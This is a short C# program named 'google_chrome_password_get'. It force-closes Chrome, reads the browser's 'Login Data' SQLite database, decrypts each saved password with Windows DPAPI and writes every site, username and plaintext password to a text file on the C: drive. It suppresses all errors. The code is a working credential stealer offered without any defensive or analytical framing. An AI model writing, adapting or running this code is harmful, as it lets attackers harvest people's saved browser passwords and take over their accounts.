using System;
using System.Text;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;

namespace google_chrome_password_get
{
    class Program
    {
        static void Main(string[] args)
        {
                try
                {
                    foreach (Process process in Process.GetProcesses())
                    {
                        if (process.ProcessName.ToString() == "chrome")
                        {
                            process.Kill();
                        }
                    }
                    string app = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string fileDb = app + "\\Google\\Chrome\\User Data\\Default\\Login Data";
                    string connectionString = $"Data Source = {fileDb}";
                    string fileName = "C:\\PassordList.txt";
                    StreamWriter sw = new StreamWriter(fileName, false, Encoding.UTF8);
                    string db_fields = "logins"; // база паролей SQLITE
                    byte[] entropy = null;
                    string description;
                    DataTable db = new DataTable();
                    string sql = $"SELECT * FROM {db_fields}";
                    using (SQLiteConnection connection = new SQLiteConnection(connectionString))
                    {
                        SQLiteCommand command = new SQLiteCommand(sql, connection);
                        SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                        adapter.Fill(db);
                    }

                    int rows = db.Rows.Count;

                    for (int i = 0; i < rows; i++)
                    {
                        string url = db.Rows[i][1].ToString();
                        string login = db.Rows[i][3].ToString();
                        byte[] byteArray = (byte[])db.Rows[i][5];
                        byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                        string password = new UTF8Encoding(true).GetString(decrypted);
                        sw.WriteLine("----------------------------");
                        sw.WriteLine($"Log Num: {i}");
                        sw.WriteLine($"Site: {url}");
                        sw.WriteLine($"Login: {login}");
                        sw.WriteLine($"Pass: {password}");
                    }
                    sw.Close();
                }
                catch
                {

                }
        }
    }
}
